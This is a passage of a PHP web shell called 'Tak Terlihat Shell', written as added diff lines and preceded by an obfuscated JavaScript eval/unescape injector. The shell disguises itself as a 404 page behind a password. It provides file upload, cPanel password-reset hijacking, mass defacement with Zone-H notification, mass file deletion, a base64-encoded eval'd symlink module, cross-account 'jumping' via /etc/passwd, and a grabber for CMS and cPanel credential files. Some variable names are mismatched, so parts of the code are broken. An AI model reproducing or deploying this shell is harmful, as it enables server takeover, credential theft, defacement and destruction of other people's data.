\x74ype=\"\x74\x65\x78\x74/\x6a\x61vas\x63r\x69pt\">\n<!-- \n\x65\x76al(\x75\x6e\x65\x73ca\x70\x65('%\x366%\x375\x25\x36e\x25\x36\x33\x25\x37\x34%6\x39%6f%6\x65%\x32\x30\x257\x30%\x33\x34\x25\x332\x25\x364\x253\x38\x25\x363\x25\x328%\x37\x33\x252\x39\x25\x320\x25\x37\x62\x25\x30a%\x30\x39\x2576\x25\x36\x31\x25\x37\x32%20%\x372\x25\x320\x253\x64%2\x30\x25\x322%\x32\x32%3b%\x30a\x25\x30\x39\x257\x36\x256\x31\x25\x372%\x32\x30\x25\x37\x34%\x36d\x25\x370%\x320\x25\x33\x64%2\x30\x2573%\x32e\x2573\x257\x30\x25\x36\x63\x2569\x257\x34%28%\x322\x253\x31\x2532%\x33\x31\x25\x330\x2538%3\x35%35%3\x37%22\x25\x329\x25\x33b%\x30a\x25\x309%73%\x32\x30%\x33d%20\x25\x37\x35\x25\x36e%\x365\x25\x373%63%6\x31%70%65%2\x38%7\x34\x25\x36\x64%\x370\x25\x35\x62\x25\x330%\x35\x64\x2529%\x33b%0a%\x30\x39%6b\x252\x30%3d%\x320\x25\x375\x25\x36\x65\x25\x365%\x37\x33%\x363%61%7\x30%\x36\x35\x25\x328%7\x34\x256d\x257\x30%\x35\x62%\x33\x31%\x35d%20\x25\x32\x62%\x320\x252\x32%38%\x33\x35%36\x25\x33\x31%\x336%\x332\x2522\x252\x39\x253\x62%\x30a%0\x39%\x366\x25\x36\x66%72\x252\x38\x2520%\x37\x36\x25\x36\x31\x25\x372\x25\x32\x30%69%2\x30\x25\x33d\x25\x320%3\x30%3b\x2520\x25\x36\x39\x25\x320%\x33c%\x32\x30\x25\x37\x33%2\x65%\x36\x63\x256\x35%\x36\x65%\x367\x25\x374\x256\x38%3\x62\x252\x30\x25\x36\x39\x252\x62%\x32b\x252\x39\x25\x32\x30\x257b%0\x61\x25\x309%0\x39\x2572\x2520%\x32b\x25\x33d%2\x30\x25\x353%\x37\x34%\x37\x32\x25\x36\x39\x25\x36\x65%6\x37%2\x65\x25\x366%\x372%6f%\x36\x64%4\x33\x2568\x2561%\x372\x25\x343%\x36\x66\x2564%6\x35%2\x38%28%\x37\x30\x25\x361\x2572\x2573%\x36\x35\x25\x349%\x36\x65%\x374%2\x38\x25\x36\x62%2\x65\x2563\x25\x36\x38\x256\x31\x25\x372%\x34\x31\x257\x34\x25\x32\x38%69%\x325\x256\x62%\x32\x65%\x36c%\x365%6\x65%\x367\x25\x37\x34%6\x38\x25\x329%2\x39%\x35\x65%\x37\x33%2e\x256\x33%\x36\x38%\x361%72\x25\x34\x33%6f%6\x34%65\x2541%\x374%2\x38\x2569%29%2\x39%2\x62\x25\x337%\x32\x39%\x33\x62\x25\x30a%0\x39\x257d\x250a\x2509\x25\x37\x32%\x36\x35\x2574\x257\x35%7\x32%6\x65%\x320%\x37\x32%\x33\x62\x25\x30a%7\x64%0a'));\ne\x76\x61l(\x75n\x65s\x63a\x70e('\x25\x36\x34\x25\x36\x66%6\x33%7\x35\x256\x64%\x36\x35\x25\x36\x65\x257\x34\x25\x32\x65%\x37\x37\x2572\x25\x36\x39\x25\x37\x34%\x36\x35\x25\x328\x25\x37\x30\x253\x34\x253\x32%64%3\x38\x256\x33%2\x38\x25\x327\x27) + \x27%30%\x36b\x25\x35b%6\x32%\x36\x33\x256e\x256\x65\x251\x31%\x36\x39%\x36d%5\x64%\x330%\x31\x39%\x364%6a\x256a%\x36\x30%\x33\x32%\x32f\x25\x32b\x25\x378\x25\x375%7\x36%2\x36\x25\x36\x64\x252\x63%\x335%\x320%67%\x357%\x36\x36\x25\x320\x256e%63\x252d\x25\x37\x34\x255\x62\x25\x375\x25\x35e%\x36\x37%74%\x32\x66%5\x35\x256\x33%7\x34%2\x34%\x36b\x2569%1d%\x336%\x33\x33\x25\x32a%6\x39%5b\x25\x36c\x25\x36\x62%\x368%\x36\x61\x2534\x31\x32108\x35\x35\x37%\x335%3\x37%37%\x33\x39%3\x31\x25\x337%3\x33'\x20+ un\x65\x73\x63\x61\x70e(\x27\x252\x37\x2529%29\x25\x33\x62\x27));\n// -->\n</\x73\x63r\x69p\x74\x3e\n";
+<?php 
+// Priv Shell 
+// Silence Because Yourself
+
+error_reporting(0);
+header('HTTP/1.0 404 Not Found', true, 404);
+session_start();
+$pass = "admin";
+$link = "fvck.txt";
+if($_POST['password'] == $pass) {
+  $_SESSION['forbidden'] = $pass;
+  echo "<script>window.location='?zet'</script>";
+}
+if($_GET['page'] == "blank") {
+  echo "<a href='?'>Back</a>";
+  exit();
+}
+if(isset($_REQUEST['logout'])) {
+  session_destroy();
+  echo "<script>window.location='?zet'</script>";
+}
+if(!($_SESSION['forbidden'])) {
+?>
+<title>404 Not Found</title>
+<meta name="theme color" content="black"> </meta>
+<link href="https://fonts.googleapis.com/css?family=Patrick+Hand" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Oxanium&display=swap" rel="stylesheet">
+
+<html>
+<head>
+	<title>Tak Terlihat Shell</title>
+<meta charset="UTF-8"> <meta name="Author" content="Zildan-Sec" /> <meta name="copyright" content="|I<3U|" /<meta name="description" content="Cowok Tersakiti Team" />
+</head>
+<style>
+	input { margin:0;background-color:#fff;border:1px solid #fff; }
+</style>
+<body bgcolor="white">
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<p>Additionally, a 404 Not Found
+error was encountered while trying to use an ErrorDocument to handle the request.</p>
+
+	<form method="post">
+		<input type="password" name="password" placeholder="">
+		<br>
+		<br>
+		<?php echo $_SESSIOM['forbidden']; ?>
+	    </form>
+	  </td>
+	 </table>
+
+<?php 
+
+exit();
+}
+ ?>
+<?php
+error_reporting(0);
+set_time_limit(0);
+
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+echo '<!DOCTYPE HTML>
+<html>
+<head>
+  <link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
+<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
+<title>WELCOME TO Tak Terlihat Shell</title>
+<meta property="og:image" src="https://i.gifer.com/7M1g.gif"/>
+<style>
+body{
+font-family: Kelly Slab;
+background-color: black;
+color:white;
+}
+#content tr:hover{
+background-color: #00ddff;
+text-shadow:0px 0px 10px #fff;
+}
+#content .first{
+background-color: #00ddff;
+color:white
+}
+table{
+border: 1px #000000;
+}
+a{
+color:white;
+font-size: 19px;
+text-decoration:none;
+}
+a:hover{
+color:green;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+border: 2px #000000 solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+h2{
+font-family:Kelly Slab;
+font-size:25px;
+color:white;
+}
+h3{
+font-size:35px;
+}
+h4{
+font-size:15px;
+font-family:Kelly Slab;
+color:white;
+}
+.destroy_table {;
+  background:transparent;
+  border:1px solid #00ddff;
+  font-family:Kelly Slab;
+    display:inline-block;
+  cursor:pointer;
+  color:yellow;
+  font-size:17x;
+  font-weight:bold;
+  padding:3px 20px;
+  text-decoration:white;
+  text-shadow:0px 0px 0px #ff0505;
+       }
+       .td_table {;
+  background-color: #000000;
+            background-image: url(https://i.gifer.com/2f6g.gif);
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: 100%  100%;   
+border: 1px solid gold; 
+padding: 0px; 
+margin-left: 2px; 
+text-align: center;
+}
+     .potext {
+  border: 1px solid #ffffff;
+  width: 100%;
+  height: 400px;
+  padding-left: 5px;
+  margin: 10px auto;
+  resize: none;
+  background-color: #000000;
+            background-image: url(https://i.gifer.com/2f6g.gif);
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: 100%  100%;   
+  color: #ffffff;
+  font-family:Kelly Slab;
+  font-size: 13px;
+}
+.pl{
+background:transparent; 
+border: 1px solid red; 
+padding: 5px; 
+margin-left: 20px; 
+text-align: center;
+}
+.pt{
+background:transparent; 
+border: 1px solid red; 
+padding: 5px; 
+margin-left: 20px; 
+text-align: left;
+}
+</style>
+</head>
+<body>
+<center>
+<br>
+<font face="Kelly Slab" color="white" size="7px">WELCOME TO Tak Terlihat Shell</font><br>
+</h1></center>
+<center><b><font face="courier new" color="white" size="5">� Subcribe Info Cyber Hacker �</font></b></center>
+<marquee><b><fonte face="courier new" color="white" size="4">Cowok Tersakiti Team - JawaBaratCyber - And All My Friend</font></b></marquee>
+<center><audio autoplay="autoplay" controls="controls" src="https://h.top4top.io/m_16378jw0k0.m3" type="audio/mpeg"></audio></center>
+<table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
+<tr><td>';
+echo "<tr><td><font color='white'>
++ IP Kamu Syg    <td>: <font color='LightBlue'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
++ IP Server  <td>: <font color='LightBlue'>".gethostbyname($_SERVER['HTTP_HOST'])."<tr><td><font color='white'>
++ system     <td>: <font color='LightBlue'>".php_uname()."<tr><td><font color='white'>
++ Coded By   <td>: <font color='LightBlue'>Zildan-Sec<tr><td><font color='white'>
++ Website<td>: <font color='LightBlue'>Zildan-Sec.my.id<tr><td><font color='white'>
++ Youtube <td>: <font color='LightBlue'>Info Cyber Hacker</font></tr></td><br>
+</table>";
+echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
+<center><tr align="center"><td align="center">path : ';
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+foreach($paths as $id=>$pat){
+if($pat == '' && $id == 0){
+$a = true;
+echo '<a href="?path=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$pat.'</a>/';
+}
+
+if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+echo '<font color="yellow">UPLOADED SUCCES !!!!!</script><br/>';
+}else{
+echo '<script> alert("UPLOADED FAILED COK !!!!!")</script></font><br/>';
+}
+}
+echo '</tr><tr align="center"><td align="center"><form enctype="multipart/form-data" method="POST">
+<font color="white"><br><b></font><input type="file"name="file" style="widht:900px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;"/>
+<input type="submit" value="Upload" style="margin-top:4px;width:150px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;border-radius:5px"/><br><br>
+</form></center>';
+echo "</td></tr>";
+echo "</table>";
+echo "<center>";
+echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
+echo "<a class='destroy_table' href='?'>Home</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=cmd'>cp_reset_pw</a>";
+echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=zoneh'>Zone-h</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=jumping'>Jumping</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=sym'>Symlink</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=mass'>Mass_deface</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=masse'>Mass_delete</a><br>";
+echo "<a class='destroy_table' href='?dir=$dir&to=config'>Config_grab</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=auto_edit_user'>auto_edit_user</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=endec'>End/Decode</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=hashgen'>Hash Generator</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=adminer'>Adminer</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=about'>About</a>";
+echo "</center>";
+if($_GET['do'] == 'cmd') {
+	echo'<header> 
+	<pre> 
+	- Cpanel Reset Password</pre> 
+	</header> 
+	</center> 
+	<form action="#" method="post"> 	 <input type="email" name="email" placeholder="Email Lu Tong" /> 	 <input type="submit" name="submit" value="Crack"/> 	 
+	</form> 	 	 
+	<br/><br/><br/> 
+	</p>'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<h1>Gak Bisa Di Akses Sayang??</h1>
+	<br><br> 
+	</pre>
+	</center>"; } else { echo "<center>Salin<br><br>
+	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass Disini</a><br><br></center>'; ;}}
+	echo '</td></tr><tr><td>';
+	}
+ elseif($_GET['logout'] == true) {
+	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+	echo "<script>window.location='?';</script>";
+}
+
+if($_GET['to'] == 'zoneh') {
+	if($_POST['submit']) {
+		$domain = explode("\r\n", $_POST['url']);
+		$nick =  $_POST['nick'];
+		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
+		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
+		function zoneh($url,$nick) {
+			$ch = curl_init("http://www.zone-h.com/notify/single");
+				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+				  curl_setopt($ch, CURLOPT_POST, true);
+				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
+			return curl_exec($ch);
+				  curl_close($ch);
+		}
+		foreach($domain as $url) {
+			$zoneh = zoneh($url,$nick);
+			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
+				echo "$url -> <font color=lime>OK</font><br>";
+			} else {
+				echo "$url -> <font color=red>ERROR</font><br>";
+			}
+		}
+	} else {
+		echo "<center><form method='post'>
+		<u>Defacer</u>: <br>
+		<input type='text' name='nick' size='50' value='Mr.Z'><br>
+		<u>Domains</u>: <br>
+		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
+		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
+		</form>";
+	}
+	echo "</center>";
+} elseif($_GET['to'] == 'mass') {
+	function sabun_massal($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "[<font color=lime>DONE</font>] $lokasi<br>";
+							file_put_contents($lokasi, $isi_script);
+							$idx = sabun_massal($dirc,$namafile,$isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+	function sabun_biasa($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
+							file_put_contents($lokasi, $isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+	if($_POST['start']) {
+		if($_POST['tipe_sabun'] == 'mahal') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		} elseif($_POST['tipe_sabun'] == 'murah') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		}
+	} else {
+	echo "<center>";
+	echo "<form method='post'>
+	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
+	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
+	<font style='text-decoration: underline;'>Folder:</font><br>
+	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
+	<font style='text-decoration: underline;'>Filename:</font><br>
+	<input type='text' name='d_file' value='ini.html' style='width: 450px;' height='10'><br>
+	<font style='text-decoration: underline;'>Index File:</font><br>
+	<textarea name='script' style='width: 450px; height: 200px;'>By Mr.Z</textarea><br>
+	<input type='submit' name='start' value='ENTOT COK!' style='width: 450px;'>
+	</form></center>";
+	} 
+	}elseif($_GET['to'] == 'sym') {
+echo '<hr>';
+eval(gzinflate(base64_decode('7Vf/T9tGFP89Uv6Hx5HJ9kjtJKhrReKUrjCt0lakQrdJUEWOfcYeF591d8GklP997852SOME1C/SNqlIRM777vfl81468Zwx8EEqMRE0Z0FI7c7k9PjtH8dvz62jk1fvfj9+czZ5e3JyZr3vAiFd6OSBSpxhu9WJerMgzSSqH8YpozbxqAq9LJjRyA15FhMttbubKIVmZbuVxnat49y2W4ezqygVNvlA1UQuZqTbe/bsmVY5DJNPGIZGb2hoE5bBEwkeCM6VoXe0530MwTrJVcoxmtdZhLISfuGM8eJ0Mfstza7Q+1EqaKi4WBgBiGgYLNxEzdqtl1F0tsgpKHqjPMxBmoGbJzkYzq9BFjEq1pnt1mmgUhkv4GW2sEwguQ4j5jnNbAsNByG+tLS6VmGVgRaGX4hUYY5RulvG7gwP45BxWRK1KA0TDqTdGqlgyigELL3M/JBmCsOYchFR4e9jxRaM+laRRio5+Kn3w7DkPAk54+Jg9/nPPfwbWmNtRpjP6BNL41HMMwVG3GfpjIJMP1B/MD514Q13R55mj0eeij5H+Yib8n6h9jtJxZfqYqEZFnpN28N3J6ZXQz5HPR/6+C3mggZhsuxGCCRUz7oxsU+poJcpdiDPKOnWLOc2R/JkFqgwmQSM2dauFgBiuz86ZNfq1kb0Q5kIXc6YzWVi6yc0jIPGsEGUSGd2LXTef3/ee+84MIaB9t+ZYx4w1JzL9GZySVVezNPINkPGi4yKatKuMTGBpNIj7rqpZRdh8dfyh4kpc1gljoALdXpcVNiSfkZjpAaQCBr7ONL5gecVReGu+3aJV9eIBVL66kaNmzJLL8GKJy2nX/3c0hhiGbElr3ZtdTRkeRU2eBoIvITPqNdQ9vL5lKXhBGecWaACgZn0rcmUBdmV1YhxvX+qwKoOgtUyVtna2xve3d0tE+2ZaTXddkeZpLqQZ8enZ34JjpYpWY7uisgqmwFsI/DZWPhfh0J4DAvhATBE7joeQg2I8AAi9sclzsEWxDDdvr8R3R5R2YBKjzlpYtESieBTKALz3stkkZUuwV1LBHGAC6A3qbLJu8y8veKgZUEr7pjKQ5HoFtuJKccVq+mObiro6N0cY9vLimocGvyimhUIESzskqoDuoc3bNcLD2HthXNxcOF5UmOb7C511w2tng+knMYu3gq1BE690bjHv6UhxLz+AD5+hAbD96GnGfdufCDTNCMNok7ZX/2+F8sm7zoQHkunXraNGYi80KTN3EueJ1Q0eXJjIMZeNGsy5hJNISxtiSFW+ea3yjYxtAYi72aGub6Ig8nGC0yl2ZzeD5AekIcad8MueLDbVwBe69Wh1Ipk1fMjBmp03wruaw5Wsb0B7cvxC7bMnkbuJcbUc7EO4yWI65uVS9jB9P6ZZhEvJHFut6B1E6v11dpA6nucRq+fCdW93vNvANLt1lfD9AMYXZc4GVQFtq4GjO3vR4NlaeCUimsqRl4yGH8TWH999K9CuqKzHBNFyLCDR1kfH3vmaaBRXt/hKIRHp12xRz4Ybvl1b8+B2w5eePqH1NrNZwQq7MRzAUlO6cz14W+eYtkOrK4hu+Qiw6atK2GNpsIbW8M6tPLg1F+qBnyKRBOVWTuKSuXiICJsF+VKifN5vTaeditFTV4Zm6doamWZ1Ztsk9Wv2mTNNfZtdtj3BfZ9gf1/F9jaMG7YYSMvSq/xswqZDOeZNrsyl0bpDvSmg3v1Tfj3Ksgyji+MP5wVhXU0XHrQ5sr/F+N/AA==')));
+} elseif($_GET['to'] == 'jumping') {
+	$i = 0;
+	echo "<div class='margin: 5px auto;'>";
+	if(preg_match("/hsphere/", $dir)) {
+		$urls = explode("\r\n", $_POST['url']);
+		if(isset($_POST['jump'])) {
+			echo "<pre>";
+			foreach($urls as $url) {
+				$url = str_replace(array("http://","www."), "", strtolower($url));
+				$etc = "/etc/passwd";
+				$f = fopen($etc,"r");
+				while($gets = fgets($f)) {
+					$pecah = explode(":", $gets);
+					$user = $pecah[0];
+					$dir_user = "/hsphere/local/home/$user";
+					if(is_dir($dir_user) === true) {
+						$url_user = $dir_user."/".$url;
+						if(is_readable($url_user)) {
+							$i++;
+							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
+							if(is_writable($url_user)) {
+								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
+							}
+							echo $jrw."<br>";
+						}
+					}
+				}
+			}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+		} else {
+			echo '<center>
+				  <form method="post">
+				  List Domains: <br>
+				  <textarea name="url" style="width: 500px; height: 250px;">';
+			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
+			while($getss = fgets($fp)) {
+				echo $getss;
+			}
+			echo  '</textarea><br>
+				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+				  </form></center>';
+		}
+	} elseif(preg_match("/vhosts|vhost/", $dir)) {
+		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
+		$urls = explode("\r\n", $_POST['url']);
+		if(isset($_POST['jump'])) {
+			echo "<pre>";
+			foreach($urls as $url) {
+				$url = str_replace("www.", "", $url);
+				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
+				if(is_dir($web_vh) === true) {
+					if(is_readable($web_vh)) {
+						$i++;
+						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
+						if(is_writable($web_vh)) {
+							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
+						}
+						echo $jrw."<br>";
+					}
+				}
+			}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+		} else {
+			echo '<center>
+				  <form method="post">
+				  List Domains: <br>
+				  <textarea name="url" style="width: 500px; height: 250px;">';
+				  bing("ip:$ip");
+			echo  '</textarea><br>
+				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+				  </form></center>';
+		}
+	} else {
+		echo "<pre>";
+		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
+		while($passwd = fgets($etc)) {
+			if($passwd == '' || !$etc) {
+				echo "<font color=red>Can't read /etc/passwd</font>";
+			} else {
+				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+				foreach($user_jumping[1] as $user_idx_jump) {
+					$user_jumping_dir = "/home/$user_idx_jump/public_html";
+					if(is_readable($user_jumping_dir)) {
+						$i++;
+						$jrw = "[<font color=limeBlue>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+						if(is_writable($user_jumping_dir)) {
+							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+						}
+						echo $jrw;
+						if(function_exists('posix_getpwuid')) {
+							$domain_jump = file_get_contents("/etc/named.conf");	
+							if($domain_jump == '') {
+								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
+							} else {
+								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
+								foreach($domains_jump[1] as $dj) {
+									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+									$user_jumping_url = $user_jumping_url['name'];
+									if($user_jumping_url == $user_idx_jump) {
+										echo " => ( <u>$dj</u> )<br>";
+										break;
+									}
+								}
+							}
+						} else {
+							echo "<br>";
+						}
+					}
+				}
+			}
+		}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+	}
+	echo "</div>";
+}  //MASS DELETE/////////////////////////
+elseif($_GET['to'] == 'masse') {
+   function hapus_massal($dir,$namafile) {
+if(is_writable($dir)) {
+   $dira = scandir($dir);
+   foreach($dira as $dirb) {
+       $dirc = "$dir/$dirb";
+       $lokasi = $dirc.'/'.$namafile;
+       if($dirb === '.') {
+           if(file_exists("$dir/$namafile")) {
+               unlink("$dir/$namafile");
+           }
+       } elseif($dirb === '..') {
+           if(file_exists("".dirname($dir)."/$namafile")) {
+               unlink("".dirname($dir)."/$namafile");
+           }
+       } else {
+           if(is_dir($dirc)) {
+               if(is_writable($dirc)) {
+                   if(file_exists($lokasi)) {
+                       echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
+                       unlink($lokasi);
+                       $idx = hapus_massal($dirc,$namafile);
+                   }
+               }
+           }
+       }
+   }
+}
+   }
+   if($_POST['start']) {
+echo "<div style='margin: 5px auto; padding: 5px'>";
+hapus_massal($_POST['d_dir'], $_POST['d_file']);
+echo "</div>";
+   } else {
+   echo "<center>";
+   echo "<form method='post'>
+   <font>Folder :</font><br>
+   <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
+   <font>Filename :</font><br>
+   <input type='text' name='d_file' value='nyawa lu aja mass delete gan:v' style='width: 450px;' height='10'><br>
+   <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
+   </form></center>";
+   }
+   //CONFIG///////////
+   } elseif($_GET['to'] == 'config') {
+   $etc = fopen("/etc/passwd", "r") or die("<pre><font color=#666>Can't read /etc/passwd</font></pre>");
+   $idx = mkdir("zet_CONFIG", 0777);
+   $isi_htc = "Options all\nRequire None\nSatisfy Any";
+   $htc = fopen("zet_CONFIG/.htaccess","w");
+   fwrite($htc, $isi_htc);
+   while($passwd = fgets($etc)) {
+   if($passwd == "" || !$etc) {
+   echo "<font color=#666>Can't read /etc/passwd</font>";
+   } else {
+   preg_match_all('/(.*?):x:/', $passwd, $user_config);
+   foreach($user_config[1] as $user_3X0RC1ST) {
+   $user_config_dir = "/home/$user_zet/public_html/";
+   if(is_readable($user_config_dir)) {
+   $grab_config = array(
+   "/home/$user_zet/.my.cnf" => "cpanel",
+   "/home/$user_zet/.accesshash" => "WHM-accesshash",
+   "/home/$user_zet/public_html/vdo_config.php" => "Voodoo",
+   "/home/$user_zet/public_html/bw-configs/config.ini" => "BosWeb",
+   "/home/$user_zet/public_html/config/koneksi.php" => "Lokomedia",
+   "/home/$user_zet/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
+   "/home/$user_zet/public_html/clientarea/configuration.php" => "WHMCS",
+   "/home/$user_zet/public_html/whm/configuration.php" => "WHMCS",
+   "/home/$user_zet/public_html/whmcs/configuration.php" => "WHMCS",
+   "/home/$user_zet/public_html/forum/config.php" => "phpBB",
+   "/home/$user_zet/public_html/sites/default/settings.php" => "Drupal",
+   "/home/$user_zet/public_html/config/settings.inc.php" => "PrestaShop",
+   "/home/$user_zet/public_html/app/etc/local.xml" => "Magento",
+   "/home/$user_zet/public_html/joomla/configuration.php" => "Joomla",
+   "/home/$user_zet/public_html/configuration.php" => "Joomla",
+   "/home/$user_zet/public_html/wp/wp-config.php" => "WordPress",
+   "/home/$user_zet/public_html/wordpress/wp-config.php" => "WordPress",
+   "/home/$user_zet/public_html/wp-config.php" => "WordPress",
+   "/home/$user_zet/public_html/admin/config.php" => "OpenCart",
+   "/home/$user_zet/public_html/slconfig.php" => "Sitelok",
+   "/home/$user_zet/public_html/application/config/database.php" => "Ellislab");
+   foreach($grab_config as $config => $nama_config) {
+   $ambil_config = file_get_contents($config);
+   if($ambil_config == '') {
+   } else {	
+   $file_config = fopen("3X0RC1ST_CONFIG/$user_jefri-$nama_config.txt","w");
+   fputs($file_config,$ambil_config);
+   }
+   }
+   }      
+   }
+   }  
+   }
+   echo "<center><a href='?path=$path/3X0RC1ST_CONFIG'><font color=#52CF38>Selesai!</font></a></center>";
+ 
+ } elseif($_GET['do'] == 'auto_edit_user') {
+ if($_POST['hajar']) {
